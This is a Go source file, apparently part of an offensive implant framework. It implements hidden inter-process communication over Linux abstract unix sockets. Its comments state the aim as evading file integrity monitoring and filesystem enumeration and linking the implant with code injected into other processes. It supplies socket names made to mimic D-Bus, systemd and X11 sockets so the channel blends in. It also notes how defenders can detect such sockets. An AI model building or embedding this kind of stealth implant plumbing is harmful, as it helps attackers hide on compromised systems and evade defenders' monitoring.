package stealth

// Abstract Unix Socket IPC — Invisible Cross-Process Communication
//
// OPSEC rationale: Abstract namespace unix domain sockets (names starting
// with \0) have NO filesystem representation. They cannot be found by:
//   - find, ls, or any filesystem enumeration
//   - inotify/fanotify watches
//   - File integrity monitoring (AIDE, Tripwire, OSSEC)
//
// Only `ss -x` or `netstat -x` reveals them, and only if you know to look.
// The socket name appears as "@name" in ss output.
//
// We use abstract sockets for:
//   - IPC between the implant and injected code in other processes
//   - Communication between namespace layers (outer decoy → inner operational)
//   - Coordination between multiple implant instances
//
// Capability: None (unix sockets are unprivileged)
// Kernel: Any (abstract namespace has been available since Linux 2.2)
//
// Detection:
//   - `ss -xlp` shows abstract sockets with owning process
//   - /proc/net/unix lists all unix sockets including abstract
//   - Choose names that look like legitimate D-Bus or systemd sockets

import (
	"fmt"
	"net"
)

// AbstractSocket provides IPC over abstract namespace unix domain sockets.
type AbstractSocket struct {
	name     string
	listener net.Listener
}

// Suggested innocuous socket names that blend with system sockets.
var AbstractSocketNames = []string{
	"@/run/dbus/system_bus_socket.private",
	"@/run/systemd/journal/stdout.1",
	"@/tmp/.X11-unix/X0.auth",
	"@/run/user/0/bus.monitor",
	"@/run/systemd/notify.health",
}

// NewAbstractSocket creates an abstract namespace unix socket listener.
// The name should include the leading '@' which maps to the \0 prefix.
// Example: "@/run/systemd/health" → abstract socket "\0/run/systemd/health"
func NewAbstractSocket(name string) (*AbstractSocket, error) {
	// net.Listen with "unix" and a name starting with @ creates an abstract socket.
	// Go's net package handles the \0 prefix automatically.
	listener, err := net.Listen("unix", name)
	if err != nil {
		return nil, fmt.Errorf("abstract socket %s: %v", name, err)
	}

	return &AbstractSocket{
		name:     name,
		listener: listener,
	}, nil
}

// Accept waits for and returns the next incoming connection.
func (as *AbstractSocket) Accept() (net.Conn, error) {
	return as.listener.Accept()
}

// Close shuts down the listener. Since abstract sockets have no filesystem
// entry, there's nothing to clean up on disk.
func (as *AbstractSocket) Close() error {
	return as.listener.Close()
}

// Dial connects to an abstract namespace unix socket.
func DialAbstract(name string) (net.Conn, error) {
	conn, err := net.Dial("unix", name)
	if err != nil {
		return nil, fmt.Errorf("dial abstract %s: %v", name, err)
	}
	return conn, nil
}

// SendMessage sends a length-prefixed message over a connection.
func SendAbstractMsg(conn net.Conn, data []byte) error {
	// Combine header+data into a single write for atomicity
	msg := make([]byte, 4+len(data))
	msg[0] = byte(len(data) >> 24)
	msg[1] = byte(len(data) >> 16)
	msg[2] = byte(len(data) >> 8)
	msg[3] = byte(len(data))
	copy(msg[4:], data)

	_, err := conn.Write(msg)
	return err
}

// RecvMessage receives a length-prefixed message from a connection.
func RecvAbstractMsg(conn net.Conn) ([]byte, error) {
	header := make([]byte, 4)
	if _, err := readFull(conn, header); err != nil {
		return nil, err
	}

	ulen := uint32(header[0])<<24 | uint32(header[1])<<16 | uint32(header[2])<<8 | uint32(header[3])
	if ulen == 0 || ulen > 1<<20 { // 1MB max
		return nil, fmt.Errorf("invalid message length: %d", ulen)
	}
	length := int(ulen)

	data := make([]byte, length)
	if _, err := readFull(conn, data); err != nil {
		return nil, err
	}

	return data, nil
}

func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}

// Name returns the socket name.
func (as *AbstractSocket) Name() string {
	return as.name
}

// AbstractSocketAvailable checks if abstract unix sockets work.
func AbstractSocketAvailable() bool {
	l, err := net.Listen("unix", "@/run/systemd/probe")
	if err != nil {
		return false
	}
	l.Close()
	return true
}
